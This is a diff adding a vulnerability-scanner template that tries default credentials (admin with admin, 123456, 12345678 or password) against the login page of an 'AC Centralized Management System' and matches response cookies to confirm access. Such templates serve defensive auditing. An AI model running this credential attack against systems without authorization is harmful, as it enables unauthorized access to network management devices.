@@ -1,0 +1,50 @@
+id: ac-weak-login
+
+info:
+  name: AC Centralized Management System - Default password
+  author: HuanXiong
+  severity: high
+
+  tags: Default Password
+
+http:
+  - raw:
+      - |
+        POST /login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user={{username}}&password={{ password }}&Submit=%E7%99%BB%E5%BD%95
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+        - 123456
+        - 12345678
+        - password
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "ac_userid=admin"
+          - "ac_passwd="
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "window.open"
+          - "text/javascript"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a004630440220063d6ba0a1de60cacd6425097a9e024a4819185f53e86397fe012e5fca8bb8b50220769e954bfd9ed06e6090d25be2bae60e790f60d9b473768dd4b849a0e865444b:922c64590222798bb761d5b6d8e72950
